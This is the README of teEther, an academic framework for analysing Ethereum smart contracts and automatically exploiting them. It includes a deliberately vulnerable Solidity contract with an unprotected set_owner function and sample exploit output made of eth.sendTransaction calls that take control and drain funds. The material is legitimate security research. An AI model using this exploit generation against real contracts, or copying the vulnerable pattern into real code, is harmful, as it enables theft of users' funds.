# teEther - Analysis and automatic exploitation framework for Ethereum smart contracts

teEther is an analysis tool for Ethereum smart contracts.
It can
* [disassemble EVM bytecode](./teether/cfg/disassembly.py#L13)
* [perform backward slicing](./teether/slicing.py#L123)
* [execute EVM bytecode](./teether/evm/evm.py#L31)
* [execute EVM bytecode **symbolically**](./teether/evm/evm.py#L290)
* [plot nice CFGs](./bin/plot_cfg.py)
* [create exploits for vulnerable smart contracts](./bin/gen_exploit.py)

## Quickstart

1. Install `teEther`
```bash
python setup.py install
```

2. Write your vulnerable smart contract
```solidity
pragma solidity ^0.4.0;

contract Test{

    struct Transaction{
        address to;
        uint amount;
    }

    mapping (bytes32 => Transaction) transactions;

    address owner;
    
    function set_owner(address new_owner){
        owner = new_owner;
    }
    
    function new_transaction(address to, uint amount) returns (bytes32){
        bytes32 token = sha3(to, amount);
        Transaction storage t = transactions[token];
        t.to = to;
        t.amount += amount;
        return token;
    }
    
    function approve(bytes32 token){
        require(owner == msg.sender);
        Transaction storage t = transactions[token];
        t.to.transfer(t.amount);
        delete transactions[token];
    }
    
}
```

3. Compile your contract
```
$ solc --bin test.sol | tail -n1 > test.code
```

4. Extract the deployed contract code
```
$ python bin/extract_contract_code.py test.code > test.contract.code
```

5. Generate an exploit
```
$ python bin/gen_exploit.py test.contract.code 0x1234 0x1000 +1000

...
eth.sendTransaction({from:"0x0000000000000000000000000000000000001234", data:"0x7cb97b2b0000000000000000000000000000000000000000000000000000000000001000", to:"0x4000000000000000000000000000000000000000", gasPrice:0})
eth.sendTransaction({from:"0x0000000000000000000000000000000000001234", data:"0x0129ab2700000000000000000000000000000000000000000000000000000000000012340000000000000000000000000000000000000000000000016bc75e2d63100103", to:"0x4000000000000000000000000000000000000000", gasPrice:0})
eth.sendTransaction({from:"0x0000000000000000000000000000000000001234", data:"0xa53a1adfce9e2ef9fe2568f35b22f98bb749862a13e0abd291c6ba4967016d629412829d", to:"0x4000000000000000000000000000000000000000", gasPrice:0})

```

## Academia

Our paper [**teEther: Gnawing at Ethereum to Automatically Exploit Smart Contracts**](https://publications.cispa.saarland/2612/1/main.pdf) was published at the [27th USENIX Security Symposium (Usenix Security 18)](https://www.usenix.org/conference/usenixsecurity18/presentation/krupp) ([slides](https://www.usenix.org/sites/default/files/conference/protected-files/security18_slides_krupp.pdf), [video](https://www.youtube.com/watch?v=mW4jQzPVP_A)).

```bibtex
@inproceedings{teEther2018,
          author = {Johannes Krupp and Christian Rossow},
       publisher = {USENIX Association},
       booktitle = {27th USENIX Security Symposium (USENIX Security 18)},
            year = {2018},
           title = {{teEther: Gnawing at Ethereum to Automatically Exploit Smart Contracts}},
             url = {https://publications.cispa.saarland/2612/},
}
```
